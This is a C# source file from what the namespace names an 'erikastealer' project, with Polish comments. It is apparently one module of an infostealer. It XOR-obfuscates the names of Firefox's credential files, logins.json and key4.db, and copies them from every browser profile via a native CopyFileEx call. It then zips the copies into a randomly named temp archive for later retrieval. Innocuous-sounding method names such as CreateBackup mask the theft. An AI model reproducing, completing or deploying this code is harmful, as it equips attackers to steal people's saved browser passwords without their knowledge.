namespace erikastealer
{
    using erikastealer.Exporters;
    using System;
    using System.IO;
    using System.IO.Compression;
    using System.Runtime.CompilerServices;
    using System.Runtime.InteropServices;
    using System.Text;

    public class FirefoxDataExporter : IExporter
    {

        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Auto)]
        static extern bool CopyFileEx(string lpExistingFileName, string lpNewFileName,
            IntPtr lpProgressRoutine, IntPtr lpData, ref bool pbCancel, uint dwCopyFlags);

        public static readonly string FirefoxProfilePath = Path.Combine(
            Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
            "Mozilla", "Firefox", "Profiles");

        public byte[] e_json = { 0x1b, 0x0e, 0x15, 0x1e, 0x0f, 0x01, 0x59, 0x0b, 0x01, 0x18, 0x0f };
        public byte[] e_key = { 0x1c, 0x04, 0x0b, 0x43, 0x4f, 0x16, 0x15 };

        // Funkcja do szyfrowania xorem
        public string addWorkstation(byte[] data, string key)
        {
            byte[] addUser = new byte[data.Length];
            byte[] key_bytes = Encoding.UTF8.GetBytes(key);

            for (int i = 0; i < data.Length; i++)
            {
                addUser[i] = (byte)(data[i] ^ key_bytes[i%key_bytes.Length]);
            }
            return Encoding.Default.GetString(addUser);
        }

        public string CreateBackup()
        {
            if (!Directory.Exists(FirefoxProfilePath))
                throw new DirectoryNotFoundException("Nie znaleziono folderu profilu Firefoxa.");

            string[] profiles = Directory.GetDirectories(FirefoxProfilePath);
            if (profiles.Length == 0)
                throw new Exception("Nie znaleziono żadnych profili Firefoxa.");

            Random rnd = new Random();
            int number = rnd.Next(1000, 9999);
            string backupFile = Path.Combine(Path.GetTempPath(), number.ToString() + "_firefox_backup.zip");
            string tempBackupFolder = Path.Combine(Path.GetTempPath(),"firefox_temp_backup");
            Console.WriteLine($"PAth to {tempBackupFolder}");
            Directory.CreateDirectory(tempBackupFolder);


            foreach (string profile in profiles)
            {
                CopyFileToTemp(profile, addWorkstation(e_json, "war"), tempBackupFolder);
                CopyFileToTemp(profile, addWorkstation(e_key, "war"), tempBackupFolder);
            }
            ZipFile.CreateFromDirectory(tempBackupFolder, backupFile);
            Directory.Delete(tempBackupFolder, true);


            return backupFile;
        }

        public void CopyFileToTemp(string profilePath, string FileName, string tempFolder)
        {
            string filePath = Path.Combine(profilePath, FileName);
            if (File.Exists(filePath))
            {
                string destinationPath = Path.Combine(tempFolder, (Path.GetFileName(profilePath)).Substring(0,3) + "_" + FileName.Substring(0,2));
                //File.Copy(filePath, destinationPath, true);
                bool cancel = false;
                CopyFileEx(filePath, destinationPath, IntPtr.Zero, IntPtr.Zero, ref cancel, 0);
                Console.WriteLine($"Skopiowano plik do: {destinationPath}");
            }
            else
            {
             
                Console.WriteLine($"Nie znaleziono pliku {FileName} w {profilePath}");
            }
        }

    }
}
